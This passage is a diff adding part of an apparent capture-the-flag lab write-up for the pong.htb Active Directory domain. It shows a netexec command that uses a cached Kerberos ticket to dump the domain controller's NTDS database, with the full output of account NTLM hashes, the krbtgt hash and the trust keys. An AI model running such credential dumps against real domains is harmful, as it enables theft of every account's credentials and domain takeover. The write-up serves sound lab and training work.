@@ -1077,3 +1077,37 @@ SMB         dc2.pong.htb    445    dc2              [+] PONG.HTB\c.carlssen from
 
 And of course i can use this ticket to show this too!
 
+```python
+❯❯❯ faketime -f +8h nxc smb dc2.pong.htb --use-kcache --smb-timeout 5 --ntds
+SMB         dc2.pong.htb    445    dc2              [*]  x64 (name:dc2) (domain:pong.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
+SMB         dc2.pong.htb    445    dc2              [+] PONG.HTB\c.carlssen from ccache (Pwn3d!)
+SMB         dc2.pong.htb    445    dc2              [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         dc2.pong.htb    445    dc2              Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b8ebfb6e9972babf9c01311748261a8:::
+SMB         dc2.pong.htb    445    dc2              Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         dc2.pong.htb    445    dc2              krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2850c6e9dfa66b220c3e013edbb23580:::
+SMB         dc2.pong.htb    445    dc2              C.Carlssen:1110:aad3b435b51404eeaad3b435b51404ee:e15edce7e905644a94f0c34a0b05104e:::
+SMB         dc2.pong.htb    445    dc2              M.Sun:1111:aad3b435b51404eeaad3b435b51404ee:deccbc15ace5cbf2d902f441783f1115:::
+SMB         dc2.pong.htb    445    dc2              Z.Zhen:1112:aad3b435b51404eeaad3b435b51404ee:df023cb090b82c55e3e18e5fbc7f9bc3:::
+SMB         dc2.pong.htb    445    dc2              A.Pearson:1113:aad3b435b51404eeaad3b435b51404ee:9a9250fa13ba7f4c25e1a5576f5b8a03:::
+SMB         dc2.pong.htb    445    dc2              P.Sanchez:1114:aad3b435b51404eeaad3b435b51404ee:5261d93d06680fc00db5454eff3bcfc0:::
+SMB         dc2.pong.htb    445    dc2              H.Gordon:1115:aad3b435b51404eeaad3b435b51404ee:2dc83c2f510d420be2bf3692e9cb7371:::
+SMB         dc2.pong.htb    445    dc2              P.Reiner:1116:aad3b435b51404eeaad3b435b51404ee:6fa016af828999bda0e26861e00afb31:::
+SMB         dc2.pong.htb    445    dc2              C.Adam:1117:aad3b435b51404eeaad3b435b51404ee:3dbc49f649cd0ed23ecd7d5071bcf00b:::
+SMB         dc2.pong.htb    445    dc2              R.Rupert:1118:aad3b435b51404eeaad3b435b51404ee:8960e808108c23470cea0551d0399e8f:::
+SMB         dc2.pong.htb    445    dc2              svc_sql:1119:aad3b435b51404eeaad3b435b51404ee:9e5de13bde362ad5cc68a49d26301c3b:::
+SMB         dc2.pong.htb    445    dc2              svc_print:1120:aad3b435b51404eeaad3b435b51404ee:e21d90eb3c651f4bfdf6606a4c07ffd5:::
+SMB         dc2.pong.htb    445    dc2              svc_ldap:1121:aad3b435b51404eeaad3b435b51404ee:f49491f9d40172069146a9c907e4d510:::
+SMB         dc2.pong.htb    445    dc2              R.Martinelli:1124:aad3b435b51404eeaad3b435b51404ee:d60fc26a0569b953a5cebd1392232630:::
+SMB         dc2.pong.htb    445    dc2              DC2$:1000:aad3b435b51404eeaad3b435b51404ee:e12246a7e57232eec29791ba3273a5b9:::
+SMB         dc2.pong.htb    445    dc2              Pong_gMSA$:1123:aad3b435b51404eeaad3b435b51404ee:989bd748ac8dd0b71ab24edccc9fc012:::
+SMB         dc2.pong.htb    445    dc2              PING$:1103:aad3b435b51404eeaad3b435b51404ee:f7c8cda1428924a652ed8a366d343c04:::
+SMB         dc2.pong.htb    445    dc2              [*] Trust keys:
+SMB         dc2.pong.htb    445    dc2              ping.htb (Incoming):rc4_hmac:f7c8cda1428924a652ed8a366d343c04
+SMB         dc2.pong.htb    445    dc2              ping.htb (Outgoing):rc4_hmac:98d8af55bbcc9cf8e364bd5a19860487
+SMB         dc2.pong.htb    445    dc2              [+] Dumped 21 NTDS hashes to /home/kali/.nxc/logs/ntds/dc2_dc2.pong.htb_2026-11-25_042205.ntds of which 16 were added to the database
+SMB         dc2.pong.htb    445    dc2              [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         dc2.pong.htb    445    dc2              [*] grep -iv disabled /home/kali/.nxc/logs/ntds/dc2_dc2.pong.htb_2026-11-25_042205.ntds | cut -d ':' -f1
+```
+
+Ill also dump the NTDS from `dc2`
+
